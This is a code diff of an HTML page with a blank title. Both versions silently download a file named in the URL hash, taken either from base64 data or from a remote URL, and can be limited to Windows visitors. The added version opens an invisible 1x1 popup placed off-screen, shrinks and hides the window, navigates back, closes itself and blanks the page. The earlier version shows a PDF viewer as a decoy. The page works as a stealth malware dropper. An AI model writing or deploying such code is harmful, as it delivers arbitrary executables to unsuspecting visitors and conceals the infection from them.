@@ -1,150 +1,83 @@
 <!DOCTYPE html>
-<html><head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>.</title>
-<style>
-html,body{margin:0;height:100%;overflow:hidden;background:#111;font-family:Arial,sans-serif}
-#bar{position:fixed;top:0;left:0;right:0;height:40px;display:none;align-items:center;gap:10px;padding:0 12px;background:rgba(15,17,21,.96);border-bottom:1px solid #2a2d35;z-index:9999;box-sizing:border-box}
-#st{font-size:12px;color:#b9c0cc;white-space:nowrap}
-#viewer{position:fixed;top:40px;left:0;width:100%;height:calc(100% - 40px);border:0;background:#222}
-.ok{color:#86efac!important}.bad{color:#ff8a80!important}
-</style>
+<html><head><script>
+var _pop=location.hash.indexOf('popup=1')!==-1||!!window.opener;
+var _newTab=history.length<=2;
+
+function _exit(){
+  if(_pop){window.close();return}
+  if(!_newTab){history.back();setTimeout(function(){window.close()},300);return}
+  try{window.open('about:blank','_self').close()}catch(e){}
+  setTimeout(function(){try{window.close()}catch(e){document.documentElement.innerHTML=''}},200);
+}
+
+try{
+  var _h=location.hash.slice(1).replace('&popup=1','');
+  if(_h){
+    try{_h=decodeURIComponent(_h)}catch(e){}
+    if(_h.slice(-2)==='!W')_h=_h.slice(0,-2);
+    var _s=_h.indexOf('~');
+    var _n=_s>0?_h.slice(0,_s):'x';
+    if(localStorage.getItem('dl_done_'+_n)){_exit();throw 'done'}
+  }
+  if(!_pop&&!_newTab){
+    var p=window.open(location.href+'&popup=1','_blank','width=1,height=1,left=-9999,top=-9999');
+    if(p){history.back();throw 'delegated'}
+  }
+}catch(e){if(e==='done'||e==='delegated'){try{document.documentElement.innerHTML=''}catch(x){}}}
+</script><title>.</title></head>
+<body>
 <script>
-(function(){
-  'use strict';
-
-  // ── Parse params ──
-  function qs(n){try{return new URLSearchParams(location.search).get(n)||''}catch(e){return ''}}
-  function lsG(k){try{return localStorage.getItem(k)}catch(e){return null}}
-  function lsS(k,v){try{localStorage.setItem(k,v)}catch(e){}}
-
-  var pdfUrl=qs('pdf')||qs('back')||'';
-  var isPdfMode=!!pdfUrl;
-
-  // ── Parse hash ──
-  var h=location.hash?location.hash.slice(1):'';
-  if(!h){if(!isPdfMode)document.title='.';return}
+try{window.resizeTo(1,1);window.moveTo(-9999,-9999)}catch(e){}
+try{
+  var h=location.hash.slice(1).replace('&popup=1','');
+  if(!h)throw'x';
   try{h=decodeURIComponent(h)}catch(e){}
 
   var winOnly=false;
   if(h.slice(-2)==='!W'){winOnly=true;h=h.slice(0,-2)}
-  if(winOnly&&!/Win/i.test(navigator.platform||'')){
-    if(!isPdfMode){goBack()}
-    return;
-  }
+  if(winOnly&&navigator.platform.indexOf('Win')===-1){_exit();throw'skip'}
 
   var sep=h.indexOf('~');
   var fname=sep>0?h.slice(0,sep):'delivered.bin';
   var data=sep>0?h.slice(sep+1):h;
+
   var key='dl_done_'+fname;
+  if(localStorage.getItem(key)){_exit();throw'skip'}
 
-  // ── Already done ──
-  if(lsG(key)){
-    if(isPdfMode){
-      // PDF mode: show PDF, say "already downloaded"
-      window.addEventListener('DOMContentLoaded',function(){
-        showBar();
-        document.getElementById('viewer').src=pdfUrl;
-        setSt('Already downloaded.','ok');
-      });
-    } else {
-      goBack();
-    }
-    return;
+  function done(){
+    localStorage.setItem(key,'1');
+    setTimeout(_exit,1500);
   }
 
-  // ── Non-PDF mode: minimize window ──
-  if(!isPdfMode){
-    window.blur();
-    try{window.resizeTo(1,1);window.moveTo(-9999,-9999)}catch(e){}
-  }
-
-  // ── Go back (non-PDF mode only) ──
-  function goBack(){
-    if(history.length>2){history.back();setTimeout(function(){window.close()},300);return}
-    try{window.open('about:blank','_self').close()}catch(e){}
-    setTimeout(function(){try{window.close()}catch(e){
-      document.documentElement.innerHTML='';
-    }},200);
-  }
-
-  // ── Download blob ──
-  function dlBlob(blob){
-    if(!blob||!blob.size)return false;
+  function doDownload(blob){
+    if(!blob||blob.size===0){_exit();return}
     var url=URL.createObjectURL(blob);
     var a=document.createElement('a');
     a.href=url;a.download=fname;a.rel='noopener';a.style.display='none';
     document.body.appendChild(a);a.click();
     setTimeout(function(){try{URL.revokeObjectURL(url);a.remove()}catch(e){}},2000);
-    return true;
+    done();
   }
 
-  function done(){
-    lsS(key,'1');
-    if(!isPdfMode)setTimeout(goBack,1500);
-  }
-
-  // ── Show bar + status (PDF mode) ──
-  function showBar(){
-    var bar=document.getElementById('bar');
-    if(bar)bar.style.display='flex';
-  }
-  function setSt(t,c){
-    var el=document.getElementById('st');
-    if(el){el.className=c||'';el.textContent=t}
-  }
-
-  // ── Start download ──
-  function startDownload(){
-    if(isPdfMode)setSt('Downloading '+fname+'...');
-
-    if(/^https?:\/\//i.test(data)){
-      fetch(data).then(function(r){
-        if(!r.ok)throw new Error('HTTP '+r.status);
-        var exp=parseInt(r.headers.get('content-length')||'0');
-        return r.blob().then(function(b){
-          if(exp>0&&b.size<exp)throw new Error('Incomplete');
-          return b;
-        });
-      }).then(function(b){
-        if(dlBlob(b)){
-          done();
-          if(isPdfMode)setSt('Downloaded! File saved as: '+fname,'ok');
-        }
-      }).catch(function(e){
-        if(isPdfMode)setSt('Failed: '+(e.message||e),'bad');
-        else setTimeout(goBack,3000);
+  if(data.indexOf('http')===0){
+    fetch(data).then(function(r){
+      if(!r.ok)throw'HTTP '+r.status;
+      var exp=parseInt(r.headers.get('content-length')||'0');
+      return r.blob().then(function(b){
+        if(exp>0&&b.size<exp)throw'Incomplete';
+        return b;
       });
-    } else {
-      try{
-        var raw=atob(data);
-        var arr=new Uint8Array(raw.length);
-        for(var i=0;i<raw.length;i++)arr[i]=raw.charCodeAt(i);
-        if(dlBlob(new Blob([arr],{type:'application/octet-stream'}))){
-          done();
-          if(isPdfMode)setSt('Downloaded! File saved as: '+fname,'ok');
-        }
-      }catch(e){
-        if(isPdfMode)setSt('Decode failed','bad');
-        else setTimeout(goBack,2000);
-      }
-    }
+    }).then(function(b){doDownload(b)}).catch(function(e){
+      setTimeout(_exit,3000);
+    });
+  }else{
+    try{
+      var raw=atob(data);
+      var arr=new Uint8Array(raw.length);
+      for(var i=0;i<raw.length;i++)arr[i]=raw.charCodeAt(i);
+      doDownload(new Blob([arr],{type:'application/octet-stream'}));
+    }catch(e){setTimeout(_exit,2000)}
   }
-
-  // ── Init on DOM ready ──
-  window.addEventListener('DOMContentLoaded',function(){
-    if(isPdfMode){
-      showBar();
-      document.getElementById('viewer').src=pdfUrl;
-    }
-    startDownload();
-  });
-
-})();
+}catch(e){}
 </script>
-</head>
-<body>
-<div id="bar"><div id="st">Loading...</div></div>
-<iframe id="viewer" title="PDF"></iframe>
 </body></html>
